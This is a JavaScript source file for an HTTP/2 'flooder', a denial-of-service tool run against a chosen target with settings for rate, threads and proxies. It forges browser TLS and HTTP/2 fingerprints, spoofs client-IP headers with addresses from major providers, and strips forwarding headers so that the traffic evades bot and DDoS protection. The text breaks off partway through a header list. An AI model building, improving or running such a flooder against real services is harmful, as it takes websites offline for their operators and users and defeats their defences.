const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
var colors = require("colors");
const HPACK = require("hpack");
const v8 = require("v8");
const os = require("os");

function randstr(length) {
    // Limit string length to prevent memory issues
    const safeLength = Math.min(length, SAFE_MEMORY_SETTINGS.MAX_STRING_LENGTH);

   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
    for (let i = 0; i < safeLength; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }

// Fixed accept header to match fingerprint
const accept_header = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';

if (process.argv.length < 6) {
  console.log('node flooder target time rate thread proxy');
  process.exit();
}

// Exact cipher list from fingerprint
const ciphersList = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
    "TLS_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_RSA_WITH_AES_128_CBC_SHA",
    "TLS_RSA_WITH_AES_256_CBC_SHA"
];

// Convert to OpenSSL format for Node.js
const ciphers = ciphersList.join(':');

// Fixed user agent
const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36';

// Exact signature algorithms from fingerprint
const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'rsa_pss_rsae_sha256',
    'rsa_pkcs1_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pss_rsae_sha384',
    'rsa_pkcs1_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha512'
];

// Join with exact format from fingerprint
const SignalsList = sigalgs.join(':');

// Exact supported groups from fingerprint
const ecdhCurve = "X25519:P-256:P-384";

// TLS versions from fingerprint (771 = TLS 1.2, 772 = TLS 1.3)
const tls_versions = ['TLSv1.2', 'TLSv1.3'];

// Exact TLS extensions from fingerprint
const tlsExtensions = [
    {id: 65281, data: Buffer.from([0x00])}, // extensionRenegotiationInfo
    {id: 0}, // server_name
    {id: 11, data: Buffer.from([0x01, 0x00, 0x01, 0x02])}, // ec_point_formats
    {id: 10, data: Buffer.from([0x00, 0x06, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x18])}, // supported_groups
    {id: 35, data: Buffer.from([])}, // session_ticket
    {id: 5}, // status_request
    {id: 16, data: Buffer.from([0x00, 0x0c, 0x02, 0x68, 0x32, 0x08, 0x68, 0x74, 0x74, 0x70, 0x2f, 0x31, 0x2e, 0x31])}, // ALPN
    {id: 23, data: Buffer.from([])}, // extended_master_secret
    {id: 13}, // signature_algorithms
    {id: 43, data: Buffer.from([0x00, 0x04, 0x03, 0x04, 0x03, 0x03])}, // supported_versions
    {id: 45, data: Buffer.from([0x01, 0x01])}, // psk_key_exchange_modes
    {id: 51}, // key_share
    {id: 21, data: Buffer.alloc(484)} // padding
];

// Client random and session ID from fingerprint
const clientRandom = "21b69504955b117b14e49cccd3b41ca030aa14be2f8385dd5c54eac32d7a57db";
const sessionId = "78c66f0641bf3d173005f75cacf702aa18b15f334dc9cccc76cfd7c3d411bff7";

// Function to create custom TLS ClientHello with exact fingerprint
function createCustomClientHello() {
    // Basic structure of a ClientHello message
    const messageType = Buffer.from([0x01]); // ClientHello message type

    // TLS version (TLS 1.2 - 0x0303)
    const tlsVersion = Buffer.from([0x03, 0x03]);

    // Client random
    const randomBytes = Buffer.from(clientRandom, 'hex');

    // Session ID length and value
    const sessionIdLength = Buffer.from([0x20]); // 32 bytes
    const sessionIdBytes = Buffer.from(sessionId, 'hex');

    // Cipher suites
    const cipherSuitesBytes = Buffer.alloc(2 + ciphersList.length * 2);
    cipherSuitesBytes.writeUInt16BE(ciphersList.length * 2, 0); // Length of cipher suites in bytes

    // Write each cipher suite (dummy implementation - would need actual cipher suite values)
    for(let i = 0; i < ciphersList.length; i++) {
        cipherSuitesBytes.writeUInt16BE(0xc02f + i, 2 + i * 2); // Placeholder values
    }

    // Compression methods
    const compressionMethods = Buffer.from([0x01, 0x00]); // length 1, null compression

    // Extensions length placeholder
    const extensionsLengthBytes = Buffer.alloc(2);

    // Build extensions
    let extensionsBuffer = Buffer.alloc(0);
    for(const ext of tlsExtensions) {
        const extType = Buffer.alloc(2);
        extType.writeUInt16BE(ext.id, 0);

        if(ext.data) {
            const extLength = Buffer.alloc(2);
            extLength.writeUInt16BE(ext.data.length, 0);
            extensionsBuffer = Buffer.concat([extensionsBuffer, extType, extLength, ext.data]);
        } else {
            // Default empty extension
            extensionsBuffer = Buffer.concat([extensionsBuffer, extType, Buffer.from([0x00, 0x00])]);
        }
    }

    // Update extensions length
    extensionsLengthBytes.writeUInt16BE(extensionsBuffer.length, 0);

    // Combine all parts
    const clientHelloBody = Buffer.concat([
        tlsVersion,
        randomBytes,
        sessionIdLength,
        sessionIdBytes,
        cipherSuitesBytes,
        compressionMethods,
        extensionsLengthBytes,
        extensionsBuffer
    ]);

    // ClientHello message header
    const messageLength = Buffer.alloc(3);
    messageLength.writeUIntBE(clientHelloBody.length, 0, 3);

    // Full ClientHello message
    const clientHelloMessage = Buffer.concat([messageType, messageLength, clientHelloBody]);

    // Record layer header
    const recordHeader = Buffer.from([0x16, 0x03, 0x01]); // Type: Handshake (22), Version: TLS 1.0
    const recordLength = Buffer.alloc(2);
    recordLength.writeUInt16BE(clientHelloMessage.length, 0);

    return Buffer.concat([recordHeader, recordLength, clientHelloMessage]);
}

// Apply TLS fingerprint during TLS connection
function applyTLSFingerprint(socket) {
    // Hook into the TLS socket's write method to modify ClientHello
    const originalWrite = socket.write;
    let firstWrite = true;

    socket.write = function(data, encoding, callback) {
        if (firstWrite && data[0] === 0x16) { // TLS handshake record
            firstWrite = false;

            // Replace with custom ClientHello
            return originalWrite.call(this, createCustomClientHello(), encoding, callback);
        }
        return originalWrite.call(this, data, encoding, callback);
    };

    return socket;
}

// Secure options
const secureOptions =
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

// HTTP/2 settings exactly matching fingerprint
const http2Settings = {
    headerTableSize: 65536,         // 1
    enablePush: false,              // 2:0
    initialWindowSize: 6291456,     // 4
    maxHeaderListSize: 262144       // 6
};

// Window update increment from fingerprint
const windowUpdateIncrement = 15663105;

// Create TLS options
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: false,
    secureOptions: secureOptions,
    minVersion: tls_versions[0],
    maxVersion: tls_versions[1]
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
colors.enable();

if (cluster.isMaster) {
    // Define RAM monitoring constants
    const MAX_RAM_PERCENTAGE = 95; // Restart when RAM usage exceeds 95%
    const RESTART_DELAY = 1000;    // Wait 1 second before restarting
    const RAM_CHECK_INTERVAL = 5000; // Check RAM usage every 5 seconds

    // Function to restart the script when needed
    const restartScript = () => {
        // Kill all current workers
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        // Restart after short delay
        setTimeout(() => {
            console.clear();
            console.log('Target: ' + process.argv[2]);
            console.log('Time: ' + process.argv[3]);
            console.log('Rate: ' + process.argv[4]);
            console.log('Thread(s): ' + process.argv[5]);
            console.log(`ProxyFile: ${args.proxyFile} | Total: ${proxies.length}`);

            // Fork new workers
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    // Function to monitor RAM usage
    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        // Auto-restart if RAM usage exceeds threshold
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            // Trigger restart
            restartScript();
        }
    };

    // Start RAM monitoring
    const ramMonitorInterval = setInterval(handleRAMUsage, RAM_CHECK_INTERVAL);

    // Set up periodic memory optimization for the master process
    const masterMemoryInterval = setInterval(() => {
        optimizeMemoryUsage();
    }, 60000); // Every minute

    // Fork initial workers
   for (let counter = 1; counter <= args.threads; counter++) {
       console.clear();
       console.log('Target: ' + process.argv[2]);
       console.log('Time: ' + process.argv[3]);
       console.log('Rate: ' + process.argv[4]);
       console.log('Thread(s): ' + process.argv[5]);
       console.log(`ProxyFile: ${args.proxyFile} | Total: ${proxies.length}`);
       cluster.fork();
   }

    // Clean up intervals on exit
    process.on('exit', () => {
        clearInterval(masterMemoryInterval);
        clearInterval(ramMonitorInterval);
    });
} else {
    for (let i = 0; i < 10; i++) {
        setInterval(runFlooder, 1);
    }
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];

        // Use legitimate IP address for the connection
        const legitIP = generateLegitIP();

        // Enhanced proxy connection payload with spoofed IP
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\n` +
                       `Host: ${options.address}:443\r\n` +
                       `Connection: Keep-Alive\r\n` +
                       `Client-IP: ${legitIP}\r\n` +
                       `X-Client-IP: ${legitIP}\r\n` +
                       `Via: 1.1 ${legitIP}\r\n` +
                       `\r\n`;

        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

// Create HTTP/2 frames manually for better control
function createH2SettingsFrame() {
    // SETTINGS frame format: Length(3) + Type(1) + Flags(1) + R(1) + StreamID(3) + Payload
    const frameHeader = Buffer.alloc(9);

    // Settings payload (24 bytes)
    const payload = Buffer.alloc(24);

    // HEADER_TABLE_SIZE = 65536 (0x0001 + 0x00010000)
    payload.writeUInt16BE(0x0001, 0);
    payload.writeUInt32BE(0x00010000, 2);

    // ENABLE_PUSH = 0 (0x0002 + 0x00000000)
    payload.writeUInt16BE(0x0002, 6);
    payload.writeUInt32BE(0x00000000, 8);

    // INITIAL_WINDOW_SIZE = 6291456 (0x0004 + 0x00600000)
    payload.writeUInt16BE(0x0004, 12);
    payload.writeUInt32BE(0x00600000, 14);

    // MAX_HEADER_LIST_SIZE = 262144 (0x0006 + 0x00040000)
    payload.writeUInt16BE(0x0006, 18);
    payload.writeUInt32BE(0x00040000, 20);

    // Frame header
    frameHeader.writeUIntBE(payload.length, 0, 3); // Length
    frameHeader[3] = 0x04; // Type (SETTINGS)
    frameHeader[4] = 0x00; // Flags
    frameHeader.writeUIntBE(0, 5, 4); // Stream ID (0)

    return Buffer.concat([frameHeader, payload]);
}

function createH2WindowUpdateFrame(increment) {
    // WINDOW_UPDATE frame format: Length(3) + Type(1) + Flags(1) + R(1) + StreamID(3) + Increment(4)
    const frameHeader = Buffer.alloc(9);
    const payload = Buffer.alloc(4);

    // Window update increment (15663105)
    payload.writeUInt32BE(increment, 0);

    // Frame header
    frameHeader.writeUIntBE(payload.length, 0, 3); // Length
    frameHeader[3] = 0x08; // Type (WINDOW_UPDATE)
    frameHeader[4] = 0x00; // Flags
    frameHeader.writeUIntBE(0, 5, 4); // Stream ID (0)

    return Buffer.concat([frameHeader, payload]);
}

// HTTP/2 frame types for reference
const H2_FRAME_TYPES = {
    DATA: 0x0,
    HEADERS: 0x1,
    PRIORITY: 0x2,
    RST_STREAM: 0x3,
    SETTINGS: 0x4,
    PUSH_PROMISE: 0x5,
    PING: 0x6,
    GOAWAY: 0x7,
    WINDOW_UPDATE: 0x8,
    CONTINUATION: 0x9
};

// HTTP/2 frame flags
const H2_FLAGS = {
    END_STREAM: 0x1,
    END_HEADERS: 0x4,
    PADDED: 0x8,
    PRIORITY: 0x20
};

// Add memory allocation safety settings
// This helps prevent heap corruption
const SAFE_MEMORY_SETTINGS = {
    MAX_HEADER_SIZE: 8192,        // Maximum size for headers in bytes
    MAX_FRAME_SIZE: 16384,        // Maximum HTTP/2 frame size
    MAX_STRING_LENGTH: 1024,      // Maximum length for generated strings
    BUFFER_SAFETY_MARGIN: 256,    // Safety margin for buffer allocations
    MAX_CONCURRENT_REQUESTS: 50   // Maximum concurrent requests to prevent OOM
};

// Improved memory optimization function
function optimizeMemoryUsage() {
    // Force garbage collection if available
    if (global.gc) {
        try {
            global.gc();
        } catch (e) {
            // Ignore errors during garbage collection
        }
    }

    // Clear object references to help GC
    try {
        // Clear function entry points
        v8.clearFunctionEntryPointFromTemplate();

        // More aggressive heap cleanup
        if (v8.writeHeapSnapshot) {
            // Create a temporary heap snapshot to force cleanup of references
            const snapshotPath = `./temp_snapshot_${Date.now()}.heapsnapshot`;
            v8.writeHeapSnapshot(snapshotPath);

            // Delete the snapshot file immediately
            try {
                fs.unlinkSync(snapshotPath);
            } catch (e) {
                // Ignore errors deleting the temporary file
            }
        }
    } catch (e) {
        // Ignore errors during optimization
    }
}

// Add safer header encoding function with size limits
function safeHpackEncodeHeaders(headers) {
    try {
        // Create a shallow copy to avoid modifying original headers
        const safeHeaders = {...headers};

        // Limit header values to prevent memory issues
        Object.keys(safeHeaders).forEach(name => {
            if (typeof safeHeaders[name] === 'string' &&
                safeHeaders[name].length > SAFE_MEMORY_SETTINGS.MAX_STRING_LENGTH) {
                safeHeaders[name] = safeHeaders[name].substring(0, SAFE_MEMORY_SETTINGS.MAX_STRING_LENGTH);
            }
        });

    // Convert headers object to array format for the HPACK encoder
    const headersList = [];
        for (const [name, value] of Object.entries(safeHeaders)) {
            if (value !== undefined && value !== null) {
        headersList.push([name, value.toString()]);
    }
        }

        // Create a new HPACK encoder context
        const encoder = new HPACK.Encoder();

        // Encode the headers with size limit
        const encoded = encoder.encode(headersList);

        // Verify the size is reasonable
        if (encoded.length > SAFE_MEMORY_SETTINGS.MAX_HEADER_SIZE) {
            // Truncate to a safe size if needed
            return encoded.slice(0, SAFE_MEMORY_SETTINGS.MAX_HEADER_SIZE);
        }

        return encoded;
    } catch (err) {
        // Return empty buffer on error
        return Buffer.alloc(0);
    }
}

// Update the header frame creation function to use safer encoding
function createH2HeadersFrameWithEncoding(headers, streamId, endStream, priority) {
    try {
        // Encode headers using safer encoding function
        const encodedHeaders = safeHpackEncodeHeaders(headers);

        // Create frame header with safety checks
    const frameHeader = Buffer.alloc(9);

        // Set flags with safety checks
    let flags = 0;
    if (endStream) flags |= H2_FLAGS.END_STREAM;
    flags |= H2_FLAGS.END_HEADERS;
    if (priority) flags |= H2_FLAGS.PRIORITY;

    // Priority data if needed
    let priorityData = Buffer.alloc(0);
    if (priority) {
        priorityData = Buffer.alloc(5);
        // E bit (31st bit set for exclusive) + Stream Dependency (31 bits)
        const dependencyValue = priority.exclusive ? 0x80000000 | priority.dependsOn : priority.dependsOn;
        priorityData.writeUInt32BE(dependencyValue, 0);
        // Weight - 1
        priorityData[4] = priority.weight - 1;
    }

        // Total length with safety check
        const length = Math.min(
            encodedHeaders.length + (priority ? 5 : 0),
            SAFE_MEMORY_SETTINGS.MAX_FRAME_SIZE - 9 // Leave room for header
        );

    // Write frame header
    frameHeader.writeUIntBE(length, 0, 3); // 24-bit length
    frameHeader[3] = H2_FRAME_TYPES.HEADERS; // HEADERS frame type
    frameHeader[4] = flags; // Flags
    frameHeader.writeUInt32BE(streamId, 5); // Stream ID (31 bits)

        // Combine everything with safety check on total size
        return Buffer.concat([frameHeader, priorityData, encodedHeaders.slice(0, length - (priority ? 5 : 0))]);
    } catch (err) {
        // Return a minimal valid frame on error
        const errorHeader = Buffer.alloc(9);
        errorHeader.writeUIntBE(0, 0, 3); // Zero length
        errorHeader[3] = H2_FRAME_TYPES.HEADERS;
        errorHeader[4] = endStream ? H2_FLAGS.END_STREAM | H2_FLAGS.END_HEADERS : H2_FLAGS.END_HEADERS;
        errorHeader.writeUInt32BE(streamId, 5);
        return errorHeader;
    }
}

// Function to create HTTP/2 PRIORITY frame
function createH2PriorityFrame(streamId, priority) {
    const frameHeader = Buffer.alloc(9);
    const priorityData = Buffer.alloc(5);

    // E bit + Stream Dependency
    const dependencyValue = priority.exclusive ? 0x80000000 | priority.dependsOn : priority.dependsOn;
    priorityData.writeUInt32BE(dependencyValue, 0);
    // Weight - 1
    priorityData[4] = priority.weight - 1;

    // Write frame header
    frameHeader.writeUIntBE(5, 0, 3); // Length (5 bytes)
    frameHeader[3] = H2_FRAME_TYPES.PRIORITY; // PRIORITY frame type
    frameHeader[4] = 0; // No flags
    frameHeader.writeUInt32BE(streamId, 5); // Stream ID

    return Buffer.concat([frameHeader, priorityData]);
}

// HTTP/2 SETTINGS ACK frame
function createH2SettingsAckFrame() {
    const frameHeader = Buffer.alloc(9);

    // Write frame header
    frameHeader.writeUIntBE(0, 0, 3); // Length (0)
    frameHeader[3] = H2_FRAME_TYPES.SETTINGS; // SETTINGS frame type
    frameHeader[4] = 0x1; // ACK flag
    frameHeader.writeUInt32BE(0, 5); // Stream ID (0)

    return frameHeader;
}

// Browser emulation constants - more realistic behaviors
const BROWSER_TIMING = {
    MIN_REQUEST_DELAY: 50,  // Minimum delay between requests (ms)
    MAX_REQUEST_DELAY: 150, // Maximum delay between requests (ms)
    REQUEST_JITTER: 25,     // Random jitter to add to request timing (ms)
    PARALLEL_REQUESTS: [2, 3, 4, 5, 6] // Possible parallel request counts like a real browser
};

// Enhanced browser fingerprinting - replaces the old generateBrowserFingerprint function
function generateBrowserFingerprint() {
    // Common browser configurations
    const screenSizes = [
        {width: 1366, height: 768},  // Most common
        {width: 1920, height: 1080}, // Full HD
        {width: 2560, height: 1440}, // QHD
        {width: 3440, height: 1440}, // Ultrawide
        {width: 3840, height: 2160}  // 4K
    ];

    const languages = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8,fr;q=0.7",
        "es-ES,es;q=0.9,en;q=0.8",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "zh-CN,zh;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8",
        "ru-RU,ru;q=0.9,en;q=0.8"
    ];

    const screen = screenSizes[Math.floor(Math.random() * screenSizes.length)];

    // Create more realistic fingerprint with consistent values
    return {
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: 24,
            pixelDepth: 24
        },
        navigator: {
            language: languages[Math.floor(Math.random() * languages.length)],
            platform: ["Win32", "MacIntel", "Linux x86_64"][Math.floor(Math.random() * 3)],
            doNotTrack: Math.random() > 0.7 ? "1" : null,
            hardwareConcurrency: [2, 4, 6, 8, 12, 16][Math.floor(Math.random() * 6)]
        },
        plugins: [
            Math.random() > 0.5 ? "PDF Viewer" : null,
            Math.random() > 0.5 ? "Chrome PDF Viewer" : null,
            Math.random() > 0.5 ? "Chromium PDF Viewer" : null,
            Math.random() > 0.5 ? "Microsoft Edge PDF Viewer" : null,
            Math.random() > 0.5 ? "WebKit built-in PDF" : null
        ].filter(Boolean),
        timezone: -Math.floor(Math.random() * 12) * 60, // Timezone offset in minutes
        webgl: crypto.randomBytes(16).toString('hex'),
        canvas: crypto.randomBytes(16).toString('hex'),
        userActivation: Math.random() > 0.5
    };
}

// Enhanced header randomization for more realistic browser behavior
function randomizeHeaders(baseHeaders) {
    const headers = {...baseHeaders};
    const fingerprint = generateBrowserFingerprint();

    // Set language based on fingerprint
    headers["accept-language"] = fingerprint.navigator.language;

    // Add sec-ch headers based on fingerprint
    headers["sec-ch-ua-platform"] = `"${fingerprint.navigator.platform.split(" ")[0]}"`;

    if (fingerprint.navigator.platform === "Win32") {
        headers["sec-ch-ua"] = "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"";
    } else if (fingerprint.navigator.platform === "MacIntel") {
        headers["sec-ch-ua"] = "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"";
    } else {
        headers["sec-ch-ua"] = "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"";
    }

    // Randomly add some headers that real browsers would send
    if (Math.random() > 0.7) {
        headers["device-memory"] = ["0.5", "1", "2", "4", "8"][Math.floor(Math.random() * 5)];
    }

    if (Math.random() > 0.7) {
        headers["viewport-width"] = fingerprint.screen.width.toString();
    }

    if (Math.random() > 0.8) {
        headers["sec-ch-ua-full-version-list"] = headers["sec-ch-ua"];
    }

    if (Math.random() > 0.6) {
        headers["sec-ch-prefers-color-scheme"] = Math.random() > 0.3 ? "light" : "dark";
    }

    // Add more realistic accept header variations
    if (Math.random() > 0.8) {
        headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
    }

    return headers;
}

// New: Add browser navigation patterns for more realistic behavior
function simulateBrowserNavigation(client, baseHeaders, parsedTarget) {
    // Browser typically loads resources after main page
    const resourceTypes = [
        { path: '/style.css', type: 'style' },
        { path: '/script.js', type: 'script' },
        { path: '/favicon.ico', type: 'image' },
        { path: '/logo.png', type: 'image' }
    ];

    // Request some resources after main page
    setTimeout(() => {
        for (const resource of resourceTypes) {
            if (Math.random() > 0.5) { // Don't request all resources every time
                // Create modified headers for resource request
                const resourceHeaders = {...baseHeaders};
                resourceHeaders[':path'] = parsedTarget.path + resource.path;
                resourceHeaders['sec-fetch-dest'] = resource.type;
                resourceHeaders['sec-fetch-mode'] = 'no-cors';

                // Send resource request
                const request = client.request(resourceHeaders, {
                    endStream: true,
                    exclusive: true,
                    parent: 0,
                    weight: 256,
                    waitForTrailers: false
                });

                request.on("response", response => {
                    request.close();
                    request.destroy();
                    return;
                });

                request.end();

                // Add delay between resource requests
                setTimeout(() => {}, Math.random() * 100);
            }
        }
    }, 300 + Math.random() * 200);
}

// Randomize request timing with natural patterns
function getRandomDelay() {
    // Base delay
    const baseDelay = Math.random() * (BROWSER_TIMING.MAX_REQUEST_DELAY - BROWSER_TIMING.MIN_REQUEST_DELAY) + BROWSER_TIMING.MIN_REQUEST_DELAY;

    // Add some jitter
    const jitter = (Math.random() * 2 - 1) * BROWSER_TIMING.REQUEST_JITTER;

    return baseDelay + jitter;
}

// Create TCP fingerprint like a real browser
function modifyTcpOptions(socket) {
    // This is just a placeholder as we can't directly modify TCP options in Node.js
    // In a real implementation, you might use raw sockets or other methods
    // Real browsers have specific TCP window sizes, TTL values, etc.
    return socket;
}

// Function to generate legitimate-looking IP addresses
function generateLegitIP() {
    const asnData = [
        { asn: "AS15169", country: "US", ip: "8.8.8." },        // Google
        { asn: "AS8075", country: "US", ip: "13.107.21." },     // Microsoft
        { asn: "AS14061", country: "SG", ip: "104.18.32." },    // DigitalOcean
        { asn: "AS13335", country: "NL", ip: "162.158.78." },   // Cloudflare
        { asn: "AS16509", country: "DE", ip: "3.120.0." },      // Amazon AWS
        { asn: "AS14618", country: "JP", ip: "52.192.0." },     // Amazon AWS Japan
        { asn: "AS32934", country: "US", ip: "157.240.0." },    // Facebook
        { asn: "AS54113", country: "US", ip: "104.244.42." },   // Fastly
        { asn: "AS15133", country: "US", ip: "69.171.250." }    // MCI Communications
    ];

    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

// Function to remove X-Forwarded-For headers from requests
function removeXForwardedHeaders(headers) {
    const cleanedHeaders = {...headers};

    // Remove any X-Forwarded-* headers
    const forwardedHeaders = [
        "x-forwarded-for",
        "x-forwarded-host",
        "x-forwarded-proto",
        "forwarded",
        "x-real-ip",
        "x-originating-ip",
        "cf-connecting-ip",
        "true-client-ip"
    ];

    forwardedHeaders.forEach(header => {
        if (cleanedHeaders[header]) {
            delete cleanedHeaders[header];
        }
    });

    return cleanedHeaders;
}

// Function to generate alternative IP headers that are less likely to be detected
function generateAlternativeIPHeaders() {
    const headers = {};

    // Use probability to randomly include some but not all headers
    // This makes the request pattern less predictable
    if (Math.random() < 0.5) headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = generateLegitIP();
    if (Math.random() < 0.5) headers["via"] = `1.1 ${generateLegitIP()}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = generateLegitIP();
    if (Math.random() < 0.3) headers["x-coming-from"] = generateLegitIP();
    if (Math.random() < 0.4) headers["akamai-client-ip"] = generateLegitIP();

    // Include at least one header if all randomization failed
    if (Object.keys(headers).length === 0) {
        headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    }

    return headers;
}

// Add periodic heap status check
function checkHeapStatus() {
    const heapStats = v8.getHeapStatistics();
    const heapSizeLimit = heapStats.heap_size_limit;
    const totalHeapSize = heapStats.total_heap_size;
    const usedHeapSize = heapStats.used_heap_size;

    // If heap usage is above 80%, try to optimize
    if (usedHeapSize > totalHeapSize * 0.8) {
        optimizeMemoryUsage();
    }

    return {
        usedPercent: Math.round((usedHeapSize / heapSizeLimit) * 100),
        totalHeapSize: Math.round(totalHeapSize / (1024 * 1024)) + ' MB',
        usedHeapSize: Math.round(usedHeapSize / (1024 * 1024)) + ' MB'
    };
}

// Add standard browser URI paths to make requests look more legitimate
const STANDARD_URI_PATHS = [
    '/',
    '/index.html',
];

// Add common URL parameters
const COMMON_URL_PARAMS = [
    'page=1',
    't=' + Date.now()
];

// Standard HTTP header sets based on real browser captures
const STANDARD_HEADER_SETS = [
    // Chrome on Windows
    {
        "sec-ch-ua": "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br",
        ...generateAlternativeIPHeaders(),
        "accept-language": "en-US,en;q=0.9"
    },
    // Firefox on macOS
    {
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.5",
        "accept-encoding": "gzip, deflate, br",
        "connection": "keep-alive",
        "upgrade-insecure-requests": "1",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "pragma": "no-cache",
        ...generateAlternativeIPHeaders(),
        "cache-control": "no-cache"
    },
    // Safari on iOS
    {
